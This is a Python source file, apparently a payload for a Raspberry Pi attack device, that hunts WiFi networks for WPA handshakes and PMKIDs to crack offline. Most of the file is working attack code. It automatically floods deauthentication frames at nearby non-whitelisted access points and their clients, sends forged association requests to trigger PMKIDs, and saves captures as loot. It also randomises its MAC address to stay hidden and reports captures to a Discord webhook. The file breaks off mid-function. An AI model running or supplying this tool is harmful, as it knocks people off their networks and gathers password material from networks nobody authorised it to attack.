#!/usr/bin/env python3
"""
RaspyJack Payload -- Pwnagotchi
================================
Author: 7h30th3r0n3

Automated WiFi handshake and PMKID hunter with pixel-art face UI.

Features:
  Full 4-way handshake capture (passive EAPOL sniffing)
  Half-handshake capture (2+ EAPOL messages, crackable with hashcat)
  PMKID capture via RSN IE parsing + active association probe
  Auto-deauth with smart targeting (toggle ON/OFF)
  Deauth backoff (avoids hammering same AP)
  Broadcast + targeted deauth with adaptive interval
  Intelligent channel hopping (skip duplicates, dynamic dwell)
  Dual WiFi card support (sniffer + attacker)
  Whitelist MAC/SSID to exclude your own networks
  Stealth mode (MAC randomize + TX power reduction)
  Peer detection (other Raspyjack on the network)
  Discord/webhook notification on capture
  Capture flash (visual feedback on handshake)
  Persistent lifetime stats across sessions
  TTL-based memory pruning (safe for long sessions)
  Pixel-art animated face with blink, pupil tracking, ZZZ
  Activity sparkline graph
  Channel activity stats view
  Capture history browser

Controls:
  OK         Start / Pause capture (session persists)
  UP / DOWN  Scroll stats
  LEFT/RIGHT Toggle deauth ON/OFF
  KEY1       Cycle views: face > stats > captures > whitelist
  KEY2       Toggle stealth mode
  KEY3       Exit (or back from sub-view)

Loot: /root/Raspyjack/loot/Pwnagotchi/
"""

import os
import sys
import time
import json
import signal
import threading
import subprocess
import random
import urllib.request
from datetime import datetime
from collections import deque

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button
from payloads._iface_helper import select_interface, list_interfaces

try:
    from scapy.all import (
        Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, Dot11ProbeReq,
        Dot11Auth, Dot11AssoReq, RadioTap, EAPOL,
        sendp, sniff as scapy_sniff, wrpcap, conf, raw,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT

LOOT_DIR = "/root/Raspyjack/loot/Pwnagotchi"
STATS_FILE = os.path.join(LOOT_DIR, "lifetime_stats.json")
CONFIG_FILE = os.path.join(LOOT_DIR, "config.json")
HANDSHAKE_DIR = os.path.join(LOOT_DIR, "handshakes")

# Channel hopping
CHANNELS_24_PRIORITY = [1, 6, 11]
CHANNELS_24_OTHER = [2, 3, 4, 5, 7, 8, 9, 10, 12, 13]
CHANNELS_24_ALL = list(range(1, 14))
CHANNELS_5 = [
    36, 40, 44, 48,             # UNII-1 — libre, indoor, pas de DFS
    52, 56, 60, 64,             # UNII-2 — DFS requis, utilisé par certaines box
]
DWELL_PRIORITY = 3
DWELL_OTHER = 1
DWELL_5GHZ = 2
DWELL_DEAUTH = 8          # seconds to stay after deauth (clients need time to reconnect)
DWELL_DUAL_CAPTURE = 12   # long dwell in dual mode after attack signal

DEAUTH_BURST_ROUNDS = 7    # repeat full packet list N times (~20+ per target)
HALF_HS_MIN = 2

# Deauth limits
MAX_DEAUTH_APS = 5
MAX_DEAUTH_CLIENTS = 10
MIN_DEAUTH_SIGNAL = -85
MAX_DEAUTHS_PER_BSSID = 10

# TTL pruning
AP_TTL = 120
STA_TTL = 300
EAPOL_TTL = 30
MAX_BEACON_CACHE = 200
MAX_PEERS = 50

# ---------------------------------------------------------------------------
# Thread-safe events (replace bare booleans)
# ---------------------------------------------------------------------------
lock = threading.Lock()
_shutdown = threading.Event()
_capture_event = threading.Event()
_attack_signal = threading.Event()      # dual mode: attacker signals sniffer

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
deauth_enabled = True
stealth_enabled = False
current_channel = 1
mood = "awake"
mood_text = "waking up..."
start_time = time.time()
last_capture_time = 0
capture_flash = 0

# Session stats
session_aps = {}
session_clients = {}          # {mac: {"bssid": str, "last_seen": float}}
session_handshakes = 0
session_half_hs = 0
session_pmkid = 0
session_deauths = 0
captured_bssids = set()
eapol_buffer = {}
beacon_cache = {}

last_capture_ssid = ""

# Channel activity
channel_activity = {ch: 0 for ch in range(1, 14)}
channel_total = {ch: 0 for ch in range(1, 166)}

# Activity sparkline
activity_history = deque([0] * 20, maxlen=20)

# Peer detection
peers_detected = set()

# Lifetime stats
lifetime_handshakes = 0
lifetime_half_hs = 0
lifetime_pmkid = 0
lifetime_networks = 0

# Whitelist
whitelist_macs = set()
whitelist_ssids = set()

# Webhook
webhook_url = ""

# Interfaces
mon_iface = None
mon_iface2 = None             # secondary card (dual mode)
dual_mode = False
attack_ch_target = 0          # channel attacker wants sniffer to follow
original_mac = ""

# View
view = "face"

# Animation state
_blink = False
_next_blink = time.time() + random.uniform(5, 10)
_pupil_x = 0.0
_pupil_target = 0
_pupil_change_time = time.time() + random.uniform(2, 4)
_zzz_phase = 0.0

# Deauth backoff
deauth_backoff = {}  # {bssid: {"count": int, "skip_until": float}}


def _cleanup_signal(*_):
    _shutdown.set()
    _capture_event.clear()


signal.signal(signal.SIGINT, _cleanup_signal)
signal.signal(signal.SIGTERM, _cleanup_signal)

# ---------------------------------------------------------------------------
# Config / Stats
# ---------------------------------------------------------------------------


def _load_stats():
    global lifetime_handshakes, lifetime_half_hs, lifetime_pmkid, lifetime_networks
    if os.path.isfile(STATS_FILE):
        try:
            with open(STATS_FILE, "r") as f:
                d = json.load(f)
            lifetime_handshakes = d.get("handshakes", 0)
            lifetime_half_hs = d.get("half_hs", 0)
            lifetime_pmkid = d.get("pmkid", 0)
            lifetime_networks = d.get("networks", 0)
        except Exception:
            pass


def _save_stats():
    os.makedirs(LOOT_DIR, exist_ok=True)
    with open(STATS_FILE, "w") as f:
        json.dump({
            "handshakes": lifetime_handshakes,
            "half_hs": lifetime_half_hs,
            "pmkid": lifetime_pmkid,
            "networks": lifetime_networks,
            "last_session": datetime.now().isoformat(),
        }, f, indent=2)


def _load_config():
    global whitelist_macs, whitelist_ssids, deauth_enabled, webhook_url
    if os.path.isfile(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                d = json.load(f)
            whitelist_macs = set(d.get("whitelist_macs", []))
            whitelist_ssids = set(d.get("whitelist_ssids", []))
            deauth_enabled = d.get("deauth_enabled", True)
            webhook_url = d.get("webhook_url", "")
        except Exception:
            pass


def _save_config():
    os.makedirs(LOOT_DIR, exist_ok=True)
    with open(CONFIG_FILE, "w") as f:
        json.dump({
            "whitelist_macs": sorted(whitelist_macs),
            "whitelist_ssids": sorted(whitelist_ssids),
            "deauth_enabled": deauth_enabled,
            "webhook_url": webhook_url,
        }, f, indent=2)


# ---------------------------------------------------------------------------
# Webhook
# ---------------------------------------------------------------------------


def _send_webhook(message):
    if not webhook_url:
        return
    try:
        data = json.dumps({"content": message}).encode("utf-8")
        req = urllib.request.Request(webhook_url, data=data,
                                     headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Monitor mode + stealth
# ---------------------------------------------------------------------------


def _get_mac(iface):
    try:
        with open(f"/sys/class/net/{iface}/address") as f:
            return f.read().strip().upper()
    except Exception:
        return ""


def _randomize_mac(iface):
    new_mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(
        random.randint(0, 255) for _ in range(5)
    )
    subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "ip", "link", "set", iface, "address", new_mac],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                   capture_output=True, timeout=5)


def _restore_mac(iface, mac):
    if not mac:
        return
    subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "ip", "link", "set", iface, "address", mac],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                   capture_output=True, timeout=5)


def _reduce_tx_power(iface):
    subprocess.run(["sudo", "iw", "dev", iface, "set", "txpower", "fixed", "500"],
                   capture_output=True, timeout=5)


def _restore_tx_power(iface):
    subprocess.run(["sudo", "iw", "dev", iface, "set", "txpower", "auto"],
                   capture_output=True, timeout=5)


def _monitor_up(iface):
    for cmd in [
        ["sudo", "ip", "link", "set", iface, "down"],
        ["sudo", "iw", iface, "set", "monitor", "none"],
        ["sudo", "ip", "link", "set", iface, "up"],
    ]:
        subprocess.run(cmd, capture_output=True, timeout=5)
    time.sleep(0.5)
    r = subprocess.run(["iw", "dev", iface, "info"], capture_output=True, text=True, timeout=5)
    if "type monitor" in r.stdout:
        return iface
    subprocess.run(["sudo", "airmon-ng", "start", iface],
                   capture_output=True, timeout=15)
    for name in (f"{iface}mon", iface):
        r = subprocess.run(["iw", "dev", name, "info"], capture_output=True, text=True,
                           timeout=5)
        if "type monitor" in r.stdout:
            return name
    return None


def _monitor_down(iface):
    if not iface:
        return
    base = iface.replace("mon", "")
    subprocess.run(["sudo", "airmon-ng", "stop", iface],
                   capture_output=True, timeout=10)
    for cmd in [
        ["sudo", "ip", "link", "set", base, "down"],
        ["sudo", "iw", base, "set", "type", "managed"],
        ["sudo", "ip", "link", "set", base, "up"],
    ]:
        subprocess.run(cmd, capture_output=True, timeout=5)


# ---------------------------------------------------------------------------
# Deauth backoff
# ---------------------------------------------------------------------------


def _should_deauth(bssid):
    info = deauth_backoff.get(bssid)
    if not info:
        return True
    if info["count"] >= MAX_DEAUTHS_PER_BSSID:
        return False
    if time.time() < info["skip_until"]:
        return False
    return True


def _record_deauth(bssid):
    if bssid not in deauth_backoff:
        deauth_backoff[bssid] = {"count": 0, "skip_until": 0}
    info = deauth_backoff[bssid]
    info["count"] += 1
    if info["count"] >= 6:
        info["skip_until"] = time.time() + 150
    elif info["count"] >= 3:
        info["skip_until"] = time.time() + 60


def _clear_backoff(bssid):
    deauth_backoff.pop(bssid, None)


# ---------------------------------------------------------------------------
# Mood engine
# ---------------------------------------------------------------------------


def _update_mood():
    global mood, mood_text
    with lock:
        aps = len(session_aps)
        hs = session_handshakes
        hhs = session_half_hs
        pm = session_pmkid
        deauths = session_deauths
        last = last_capture_ssid
        peers = len(peers_detected)
        stlth = stealth_enabled
        dm = dual_mode

    cap = _capture_event.is_set()

    if stlth:
        mood = "stealth"
        mood_text = "ghost mode active"
        return

    elapsed = time.time() - start_time
    t = time.time()

    if capture_flash > 0:
        mood = "happy"
        mood_text = f"PWNED {last[:14]}!"
        return

    if dm and int(t) % 20 < 3:
        mood = "intense"
        mood_text = "DUAL CARD ATTACK"
        return

    if peers > 0 and int(t) % 20 < 3:
        mood = "friend"
        mood_text = f"{peers} peer(s) nearby!"
        return

    if hs + hhs > 0 and int(t) % 25 < 4:
        mood = "happy"
        mood_text = f"{hs} full + {hhs} half HS"
        return

    if pm > 0 and int(t) % 25 < 4:
        mood = "grateful"
        mood_text = f"{pm} PMKID captured!"
        return

    if last and int(t) % 18 < 3:
        mood = "excited"
        mood_text = f">{last[:16]}"
        return

    if deauths > 0 and int(t) % 12 < 2:
        mood = "intense"
        mood_text = f"deauth x{deauths}"
        return

    if aps > 15:
        mood = "excited"
        mood_text = f"{aps} networks!"
    elif aps > 5:
        mood = "cool"
        mood_text = "hunting..."
    elif aps > 0:
        mood = "awake"
        mood_text = "scanning targets"
    elif elapsed > 300:
        mood = "lonely"
        mood_text = "where is everyone?"
    elif elapsed > 120:
        mood = "bored"
        mood_text = "nothing here..."
    elif not cap:
        mood = "sleeping"
        mood_text = "zzZZZzz"
    else:
        mood = "awake"
        mood_text = "looking around..."


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _is_whitelisted(bssid, essid=""):
    if (bssid or "").upper() in whitelist_macs:
        return True
    if essid and essid in whitelist_ssids:
        return True
    return False


def _save_capture(bssid, essid, pkts, capture_type="hs"):
    os.makedirs(HANDSHAKE_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe = "".join(c if c.isalnum() else "_" for c in essid)[:20]
    fname = f"{capture_type}_{safe}_{ts}.pcap"
    wrpcap(os.path.join(HANDSHAKE_DIR, fname), pkts)
    return fname


def _finalize_capture(bssid, essid, pkts, capture_type, webhook_msg):
    """Save capture pcap, update stats, send webhook. Called INSIDE lock."""
    save_pkts = []
    bcn = beacon_cache.get(bssid)
    if bcn:
        save_pkts.append(bcn)
    save_pkts.extend(pkts)
    fname = _save_capture(bssid, essid, save_pkts, capture_type)
    _save_stats()
    _clear_backoff(bssid)
    threading.Thread(
        target=_send_webhook,
        args=(webhook_msg.replace("{fname}", fname),),
        daemon=True,
    ).start()
    return fname


# ---------------------------------------------------------------------------
# TTL pruning
# ---------------------------------------------------------------------------


def _prune_stale():
    """Remove stale entries from tracking dicts. Called every 30s."""
    now = time.time()
    with lock:
        # Prune APs not seen for AP_TTL (keep captured ones)
        stale_aps = [
            bssid for bssid, info in session_aps.items()
            if now - info.get("last_seen", 0) > AP_TTL
            and bssid not in captured_bssids
        ]
        for bssid in stale_aps:
            del session_aps[bssid]
            beacon_cache.pop(bssid, None)

        # Prune clients
        stale_cli = [
            mac for mac, info in session_clients.items()
            if now - info.get("last_seen", 0) > STA_TTL
        ]
        for mac in stale_cli:
            del session_clients[mac]

        # Prune eapol_buffer
        stale_eapol = []
        for pair, pkts in eapol_buffer.items():
            if not pkts:
                stale_eapol.append(pair)
                continue
            try:
                first_time = float(pkts[0].time) if hasattr(pkts[0], 'time') else now
                if now - first_time > EAPOL_TTL:
                    stale_eapol.append(pair)
            except Exception:
                stale_eapol.append(pair)
        for pair in stale_eapol:
            del eapol_buffer[pair]

        # Cap beacon_cache
        if len(beacon_cache) > MAX_BEACON_CACHE:
            excess = list(beacon_cache.keys())[:-MAX_BEACON_CACHE]
            for k in excess:
                del beacon_cache[k]

        # Cap peers
        if len(peers_detected) > MAX_PEERS:
            peers_detected.clear()


# ---------------------------------------------------------------------------
# Packet handler
# ---------------------------------------------------------------------------


def _packet_handler(pkt):
    global session_handshakes, session_half_hs, session_pmkid
    global lifetime_handshakes, lifetime_half_hs, lifetime_pmkid
    global lifetime_networks, last_capture_ssid, last_capture_time, capture_flash

    if _shutdown.is_set() or not _capture_event.is_set():
        return

    # Fast reject: skip frames without 802.11 layer (noise, corrupt)
    if not pkt.haslayer(Dot11):
        return

    # Fast reject: skip control frames (ACK/CTS/RTS = type 1)
    dot11_type = pkt[Dot11].type
    if dot11_type == 1:
        return

    # -- Beacons: discover APs --
    if pkt.haslayer(Dot11Beacon):
        bssid = (pkt[Dot11].addr2 or "").upper()
        if not bssid or bssid == "FF:FF:FF:FF:FF:FF":
            return
        try:
            essid = pkt[Dot11Elt].info.decode("utf-8", errors="replace")
        except Exception:
            essid = ""
        if not essid:
            essid = "<hidden>"
        if _is_whitelisted(bssid, essid):
            return
        sig = getattr(pkt, "dBm_AntSignal", -99)
        with lock:
            # Cache beacon inside lock (thread safety fix)
            if bssid not in beacon_cache:
                beacon_cache[bssid] = pkt
            if bssid not in session_aps:
                session_aps[bssid] = {
                    "essid": essid, "channel": current_channel,
                    "signal": sig, "clients": set(), "last_seen": time.time(),
                }
            else:
                session_aps[bssid]["signal"] = sig
                session_aps[bssid]["last_seen"] = time.time()
            channel_activity[current_channel] = channel_activity.get(current_channel, 0) + 1
            channel_total[current_channel] = channel_total.get(current_channel, 0) + 1

    # -- Data frames: discover clients --
    if pkt.haslayer(Dot11) and pkt[Dot11].type == 2:
        src = (pkt[Dot11].addr2 or "").upper()
        bss = (pkt[Dot11].addr3 or "").upper()
        if bss in session_aps and src != bss and src != "FF:FF:FF:FF:FF:FF":
            with lock:
                session_aps[bss]["clients"].add(src)
                session_clients[src] = {"bssid": bss, "last_seen": time.time()}
                channel_activity[current_channel] = (
                    channel_activity.get(current_channel, 0) + 1
                )

    # -- Probe requests: peer detection --
    if pkt.haslayer(Dot11ProbeReq):
        try:
            ssid_raw = pkt[Dot11Elt].info.decode("utf-8", errors="replace")
            if ssid_raw.startswith("RJ_PEER_"):
                with lock:
                    peers_detected.add((pkt[Dot11].addr2 or "").upper())
        except Exception:
            pass

    # -- EAPOL: handshake + PMKID capture --
    if pkt.haslayer(EAPOL) and pkt.haslayer(Dot11):
        src = (pkt[Dot11].addr2 or "").upper()
        dst = (pkt[Dot11].addr1 or "").upper()
        pair = tuple(sorted([src, dst]))

        with lock:
            if pair not in eapol_buffer:
                eapol_buffer[pair] = []
            eapol_buffer[pair].append(pkt)
            msg_count = len(eapol_buffer[pair])

            # Find associated BSSID
            bssid = None
            for mac in pair:
                if mac in session_aps:
                    bssid = mac
                    break

            # PMKID extraction from EAPOL M1
            if bssid and bssid == src and bssid not in captured_bssids:
                try:
                    eapol_raw = bytes(pkt[EAPOL])
                    if len(eapol_raw) > 99:
                        key_info = int.from_bytes(eapol_raw[5:7], "big")
                        is_m1 = (key_info & 0x08) and (key_info & 0x80) and not (key_info & 0x100)
                        if is_m1:
                            data_len = int.from_bytes(eapol_raw[97:99], "big")
                            key_data = eapol_raw[99:99 + data_len]
                            i = 0
                            while i + 6 < len(key_data):
                                kde_type = key_data[i]
                                kde_len = key_data[i + 1]
                                if kde_type == 0xdd and kde_len >= 20:
                                    oui = key_data[i + 2:i + 5]
                                    data_type = key_data[i + 5]
                                    if oui == b'\x00\x0f\xac' and data_type == 4:
                                        pmkid = key_data[i + 6:i + 22]
                                        if pmkid != b'\x00' * 16:
                                            captured_bssids.add(bssid)
                                            session_pmkid += 1
                                            lifetime_pmkid += 1
                                            lifetime_networks += 1
                                            essid_pm = session_aps.get(bssid, {}).get("essid", "unknown")
                                            last_capture_ssid = essid_pm
                                            last_capture_time = time.time()
                                            capture_flash = 30
                                            _finalize_capture(
                                                bssid, essid_pm, [pkt], "pmkid",
                                                f"PMKID captured: {essid_pm} ({bssid})")
                                        break
                                i += 2 + kde_len if kde_len > 0 else i + 2
                except Exception:
                    pass

            if bssid and bssid not in captured_bssids:
                essid = session_aps.get(bssid, {}).get("essid", "unknown")

                if msg_count >= 4:
                    # Full 4-way handshake
                    captured_bssids.add(bssid)
                    session_handshakes += 1
                    lifetime_handshakes += 1
                    lifetime_networks += 1
                    last_capture_ssid = essid
                    last_capture_time = time.time()
                    capture_flash = 30
                    _finalize_capture(
                        bssid, essid, eapol_buffer[pair], "hs4",
                        f"Full handshake: {essid} ({bssid}) saved as {{fname}}")
                    eapol_buffer[pair] = []

            # Trim old buffers
            if msg_count > 8:
                eapol_buffer[pair] = eapol_buffer[pair][-4:]


# ---------------------------------------------------------------------------
# Half-handshake checker thread
# ---------------------------------------------------------------------------


def _half_hs_checker():
    global session_half_hs, lifetime_half_hs, last_capture_ssid
    global last_capture_time, capture_flash

    while not _shutdown.is_set() and _capture_event.is_set():
        if _shutdown.wait(timeout=10):
            break
        if not _capture_event.is_set():
            break

        with lock:
            now = time.time()
            stale_pairs = []
            for pair, pkts in eapol_buffer.items():
                if len(pkts) >= HALF_HS_MIN and len(pkts) < 4:
                    try:
                        first_time = (pkts[0].time
                                      if hasattr(pkts[0], 'time')
                                      else now - 20)
                        if now - first_time > 15:
                            stale_pairs.append(pair)
                    except Exception:
                        stale_pairs.append(pair)

            for pair in stale_pairs:
                pkts = eapol_buffer.pop(pair, [])
                if len(pkts) < HALF_HS_MIN:
                    continue
                bssid = None
                for mac in pair:
                    if mac in session_aps:
                        bssid = mac
                        break
                if bssid and bssid not in captured_bssids:
                    essid = session_aps.get(bssid, {}).get("essid", "unknown")
                    captured_bssids.add(bssid)
                    session_half_hs += 1
                    lifetime_half_hs += 1
                    lifetime_networks += 1
                    last_capture_ssid = essid
                    last_capture_time = now
                    capture_flash = 20
                    _finalize_capture(
                        bssid, essid, pkts, "hs_half",
                        f"Half handshake ({len(pkts)} msgs): {essid}")


# ---------------------------------------------------------------------------
# Deauth burst helper (shared by single + dual mode)
# ---------------------------------------------------------------------------


def _send_deauth_burst(bssid, clients, iface):
    """Blast deauth frames as fast as possible, then return for sniffing.

    Strategy: build all frames once, send at max speed (inter=0),
    repeat N rounds. Total time ~50-100ms for typical targets.
    The channel hopper dwells AFTER this to capture the reconnect handshake.
    """
    reasons = [7, 1, 4]  # Class3, Unspecified, Inactivity
    try:
        pkts = []

        for reason in reasons:
            # Broadcast (AP → all)
            pkts.append(
                RadioTap()
                / Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=bssid,
                        addr3=bssid, type=0, subtype=12)
                / Dot11Deauth(reason=reason)
            )

        for client in clients[:MAX_DEAUTH_CLIENTS]:
            for reason in reasons:
                # AP → Client
                pkts.append(
                    RadioTap()
                    / Dot11(addr1=client, addr2=bssid, addr3=bssid,
                            type=0, subtype=12)
                    / Dot11Deauth(reason=reason)
                )
                # Client → AP
                pkts.append(
                    RadioTap()
                    / Dot11(addr1=bssid, addr2=client, addr3=bssid,
                            type=0, subtype=12)
                    / Dot11Deauth(reason=reason)
                )

        # Blast at max speed: inter=0, count=1 per round
        for _ in range(DEAUTH_BURST_ROUNDS):
            sendp(pkts, iface=iface, count=1, inter=0, verbose=False)

    except Exception:
        pass


# ---------------------------------------------------------------------------
# Active PMKID probe
# ---------------------------------------------------------------------------


def _active_pmkid_probe(bssid, essid, iface):
    """Send Auth + AssocReq to AP to trigger M1 with PMKID."""
    if bssid in captured_bssids or _is_whitelisted(bssid, essid):
        return
    if not essid or essid == "<hidden>":
        return

    our_mac = _get_mac(iface)
    if not our_mac:
        our_mac = "02:00:00:00:00:01"

    try:
        # Open System Authentication
        auth = (
            RadioTap()
            / Dot11(addr1=bssid, addr2=our_mac, addr3=bssid,
                    type=0, subtype=11)
            / Dot11Auth(algo=0, seqnum=1, status=0)
        )
        sendp(auth, iface=iface, count=1, verbose=False)
        time.sleep(0.1)

        # Association Request with RSN IE
        rsn_ie = bytes([
            0x01, 0x00,
            0x00, 0x0f, 0xac, 0x04,
            0x01, 0x00,
            0x00, 0x0f, 0xac, 0x04,
            0x01, 0x00,
            0x00, 0x0f, 0xac, 0x02,
            0x00, 0x00,
        ])
        assoc = (
            RadioTap()
            / Dot11(addr1=bssid, addr2=our_mac, addr3=bssid,
                    type=0, subtype=0)
            / Dot11AssoReq(cap=0x1104, listen_interval=3)
            / Dot11Elt(ID=0, info=essid.encode())
            / Dot11Elt(ID=1, info=b'\x82\x84\x8b\x96')
            / Dot11Elt(ID=48, info=rsn_ie)
        )
        sendp(assoc, iface=iface, count=1, verbose=False)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Capture threads
# ---------------------------------------------------------------------------


def _dwell(seconds):
    """Block for `seconds`, return False if shutdown/pause."""
    if _shutdown.wait(timeout=seconds):
        return False
    return _capture_event.is_set()


def _hop_channel(iface, ch, checked_5g, supported_5g):
    """Set channel on iface. Returns True if successful."""
    global current_channel
    if ch > 14 and ch in checked_5g and ch not in supported_5g:
        return False
    r = subprocess.run(
        ["sudo", "iw", "dev", iface, "set", "channel", str(ch)],
        capture_output=True, timeout=3,
    )
    if ch > 14:
        checked_5g.add(ch)
        if r.returncode == 0:
            supported_5g.add(ch)
        else:
            return False
    with lock:
        current_channel = ch
    return True


def _do_deauth_on_channel(ch, iface):
    """Deauth uncaptured APs on channel. Returns number deauthed."""
    global session_deauths
    if not deauth_enabled:
        return 0
    with lock:
        targets = []
        for bssid, info in session_aps.items():
            if info.get("channel") != ch:
                continue
            if _is_whitelisted(bssid, info.get("essid", "")):
                continue
            if bssid in captured_bssids:
                continue
            if not _should_deauth(bssid):
                continue
            sig = info.get("signal", -99)
            if sig < MIN_DEAUTH_SIGNAL:
                continue
            clients = list(info.get("clients", set()))
            targets.append((bssid, clients, sig))

    if not targets:
        return 0

    targets.sort(key=lambda x: (len(x[1]), x[2] + 100), reverse=True)
    targets = targets[:MAX_DEAUTH_APS]
    count = 0

    for bssid, clients, _ in targets:
        _send_deauth_burst(bssid, clients, iface)
        _record_deauth(bssid)
        with lock:
            session_deauths += 1
        count += 1

    return count


def _do_pmkid_probes(ch, iface):
    """Send active PMKID probes to APs without clients on channel."""
    with lock:
        no_client_aps = [
            (bssid, info["essid"])
            for bssid, info in session_aps.items()
            if info.get("channel") == ch
            and len(info.get("clients", set())) == 0
            and bssid not in captured_bssids
            and not _is_whitelisted(bssid, info.get("essid", ""))
        ]
    for bssid, essid in no_client_aps[:3]:
        _active_pmkid_probe(bssid, essid, iface)
        time.sleep(0.2)


def _dynamic_dwell(ch, base_dwell):
    """Scale dwell time based on uncaptured AP density."""
    with lock:
        ap_count = sum(
            1 for info in session_aps.values()
            if info.get("channel") == ch and
            any(b not in captured_bssids for b in [
                b for b, i in session_aps.items() if i is info
            ])
        )
    if ap_count > 5:
        return base_dwell * 2
    elif ap_count > 2:
        return base_dwell * 1.5
    return base_dwell


def _channel_hopper():
    """Smart channel hopping with deauth + PMKID probes.

    Single mode: hop + deauth + probe on same card.
    Dual mode: slow capture-focused hopping, follows attack signals.
    """
    global current_channel
    checked_5g = set()
    supported_5g = set()

    while not _shutdown.is_set() and _capture_event.is_set():

        # ---- DUAL MODE: follow attacker signals ----
        if dual_mode:
            signaled = _attack_signal.wait(timeout=10)
            if _shutdown.is_set() or not _capture_event.is_set():
                return
            if signaled:
                _attack_signal.clear()
                ch = attack_ch_target
                _hop_channel(mon_iface, ch, checked_5g, supported_5g)
                if not _dwell(DWELL_DUAL_CAPTURE):
                    return
            else:
                # No signal — slow discovery on priority channels
                for ch in CHANNELS_24_PRIORITY:
                    if _shutdown.is_set() or not _capture_event.is_set():
                        return
                    if _hop_channel(mon_iface, ch, checked_5g, supported_5g):
                        if not _dwell(5):
                            return
            continue

        # ---- SINGLE MODE ----

        # Phase 1: Hot channels (uncaptured APs with clients)
        with lock:
            hot_channels = {}
            for bssid, info in session_aps.items():
                ch = info.get("channel", 0)
                if not ch:
                    continue
                cli = len(info.get("clients", set()))
                uncap = (bssid not in captured_bssids
                         and not _is_whitelisted(bssid, info.get("essid", "")))
                prev = hot_channels.get(ch, (0, False))
                hot_channels[ch] = (prev[0] + cli, prev[1] or uncap)

        hot_list = [
            (ch, cli) for ch, (cli, uncap) in hot_channels.items()
            if uncap and cli > 0
        ]
        hot_list.sort(key=lambda x: x[1], reverse=True)
        visited = set()

        for ch, _ in hot_list:
            if _shutdown.is_set() or not _capture_event.is_set():
                return
            if not _hop_channel(mon_iface, ch, checked_5g, supported_5g):
                continue
            visited.add(ch)
            deauthed = _do_deauth_on_channel(ch, mon_iface)
            _do_pmkid_probes(ch, mon_iface)
            dwell_time = DWELL_DEAUTH if deauthed > 0 else DWELL_PRIORITY
            if not _dwell(dwell_time):
                return

        # Phase 2: All 2.4GHz (skip already visited)
        for ch in CHANNELS_24_ALL:
            if ch in visited:
                continue
            if _shutdown.is_set() or not _capture_event.is_set():
                return
            if not _hop_channel(mon_iface, ch, checked_5g, supported_5g):
                continue
            deauthed = _do_deauth_on_channel(ch, mon_iface)
            _do_pmkid_probes(ch, mon_iface)
            dwell_time = DWELL_DEAUTH if deauthed > 0 else (
                DWELL_PRIORITY if ch in CHANNELS_24_PRIORITY else DWELL_OTHER
            )
            if not _dwell(dwell_time):
                return

        # Phase 3: 5GHz
        for ch in CHANNELS_5:
            if _shutdown.is_set() or not _capture_event.is_set():
                return
            if not _hop_channel(mon_iface, ch, checked_5g, supported_5g):
                continue
            deauthed = _do_deauth_on_channel(ch, mon_iface)
            dwell_time = DWELL_DEAUTH if deauthed > 0 else DWELL_5GHZ
            if not _dwell(dwell_time):
                return

        # Stealth: randomize MAC between cycles
        if stealth_enabled and mon_iface:
            _randomize_mac(mon_iface)


def _attack_hopper():
    """Dual mode: fast channel hop + deauth on secondary card.

    Signals the primary sniffer to follow for capture.
    """
    global attack_ch_target

    while not _shutdown.is_set() and _capture_event.is_set():
        with lock:
            targets = []
            for bssid, info in session_aps.items():
                if bssid in captured_bssids:
                    continue
                if _is_whitelisted(bssid, info.get("essid", "")):
                    continue
                if not _should_deauth(bssid):
                    continue
                sig = info.get("signal", -99)
                if sig < MIN_DEAUTH_SIGNAL:
                    continue
                clients = list(info.get("clients", set()))
                ch = info.get("channel", 0)
                if not ch:
                    continue
                targets.append((bssid, clients, ch, sig))

        targets.sort(key=lambda x: (len(x[1]), x[3] + 100), reverse=True)

        if targets:
            for bssid, clients, ch, _ in targets[:MAX_DEAUTH_APS]:
                if _shutdown.is_set() or not _capture_event.is_set():
                    return

                r = subprocess.run(
                    ["sudo", "iw", "dev", mon_iface2, "set", "channel", str(ch)],
                    capture_output=True, timeout=3,
                )
                if r.returncode != 0:
                    continue

                # Signal sniffer to follow
                attack_ch_target = ch
                _attack_signal.set()

                # Deauth from attacker card
                _send_deauth_burst(bssid, clients[:MAX_DEAUTH_CLIENTS], mon_iface2)
                _record_deauth(bssid)
                with lock:
                    session_deauths += 1

                # PMKID probe for clientless APs
                essid = session_aps.get(bssid, {}).get("essid", "")
                if not clients and essid:
                    _active_pmkid_probe(bssid, essid, mon_iface2)

                time.sleep(1.5)
        else:
            # No targets: fast discovery sweep
            for ch in CHANNELS_24_ALL:
                if _shutdown.is_set() or not _capture_event.is_set():
                    return
                subprocess.run(
                    ["sudo", "iw", "dev", mon_iface2, "set", "channel", str(ch)],
                    capture_output=True, timeout=3,
                )
                time.sleep(0.5)


def _sniffer():
    """Sniff WiFi frames on monitor interface.

    No lfilter — adding a Python callback per packet creates a bottleneck
    on busy channels and causes the kernel buffer to overflow, dropping
    EAPOL frames. _packet_handler already checks for the layers it needs
    and returns early for irrelevant frames. We maximize the socket buffer
    to avoid drops.
    """
